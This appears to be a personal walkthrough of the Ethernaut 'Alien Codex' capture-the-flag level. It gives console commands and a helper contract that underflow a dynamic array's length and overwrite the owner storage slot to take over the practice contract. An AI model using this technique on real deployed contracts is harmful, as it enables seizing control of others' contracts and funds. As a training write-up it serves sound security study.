# 19. Alien Codex
Difficulty 7/10

from: https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925
you can view contract storage using web3
`await web3.eth.getStorageAt([contractAddress],[index])`

using `await contract.make_contact()`
then `await web3.eth.getStorageAt('[contract address]', 0)`

we get: `0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272`

which shows:
`0x000000000000000000000001` is contact = true
and `da5b3fb76c78b6edee6be8f11a1c31ecfb02b272` is the owner address, confirmed by using `await contract.owner()`

I tried using retract() to underflow the codex storage, which was able to overwrite storage slot 1, but could not access slot 0, which is where the owner address is stored.  

I found the solution at https://ylv.io/ethernaut-alien-codex-solution/  
It looks like this was written in 2018 by Igor Yalovoy and the level has changed since then. We abuse the `revise` function to overwrite the storage slot holding the owner address. Since EVM storage size is 2^256-1 slots and the array starts at `keccak256(bytes32(1))`, we subtract total storage - array start -1 to get the storage slot containg owner address.  

making some changes to Igor Yalovoy's code to match the current level (1/14/22):
```
pragma solidity ^0.5.0;

contract Calc {
    
    bytes32 public one;
    uint public index;
    uint public length;
    bytes32 public lengthBytes;
    
    function getIndex() public returns (uint) {
        one = keccak256(abi.encodePacked(bytes32(uint256(1))));
        index = 2 ** 256 - 1 - uint(one) + 1;
        return index;
    }
}
```
gives us `35707666377435648211887908874984608119992236509074197713628505308453184860938` as the location in storage for the contract owner.  

using the console, we start the `underhanded` approach by using an underflow attack on the size of the codex array.  

using the console:  
`await contract.retract()`

then:  
`await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', '0x000000000000000000000000[player address]', {from:player, gas: 900000});`


**END** looked up solution
This level exploits the fact that the EVM doesn't validate an array's ABI-encoded length vs its actual payload.

Additionally, it exploits the arithmetic underflow of array length, by expanding the array's bounds to the entire storage area of `2^256`. The user is then able to modify all contract storage.

Both vulnerabilities are inspired by 2017's [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079)